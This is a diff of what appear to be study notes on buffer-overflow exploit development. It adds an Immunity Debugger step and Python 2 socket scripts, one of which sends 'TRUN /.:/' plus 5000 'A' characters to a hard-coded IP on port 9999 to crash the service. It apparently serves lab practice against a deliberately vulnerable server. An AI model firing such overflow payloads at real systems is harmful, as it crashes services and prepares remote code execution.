@@ -225,8 +225,8 @@ get output add to svupr
 
 ## Step 3 - Dynamic Anaylsis
 Run Immunity as Administrator
-        Open file > 
-
+        Open file > attach process
+        
 
 
 
@@ -235,12 +235,28 @@ Run Immunity as Administrator
 
 
 # Needed Scripts
-        #!/usr/bin/python
-        import socket
-        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
-        s.connect ((<Your Win OPs ip,9999)) #Connect to target IP and port 
-        print s.recv(1024) #print response
-        s.send(buf) #send the value of buf
-        print s.recv(1024) #print response
+        
+    #!/usr/bin/python
+    import socket
+    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
+    s.connect (("<Your Win OPs ip",9999)) #Connect to target IP and port 
+    print s.recv(1024) #print response
+    s.send(buf) #send the value of buf
+    print s.recv(1024) #print response
 
         s.close() # Close the Socket
+
+
+        #!/usr/bin/python
+    import socket
+
+    buf = "TRUN /.:/"
+    ###FUZZING###
+    buf += "A" * 5000
+    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the ipv4 socket, tcp protocol
+    s.connect (("10.50.152.93",9999)) #Connect to target IP and port 
+    print s.recv(1024) #print response
+    s.send(buf) #send the value of buf
+    print s.recv(1024) #print response
+
+    s.close() # Close the Socket
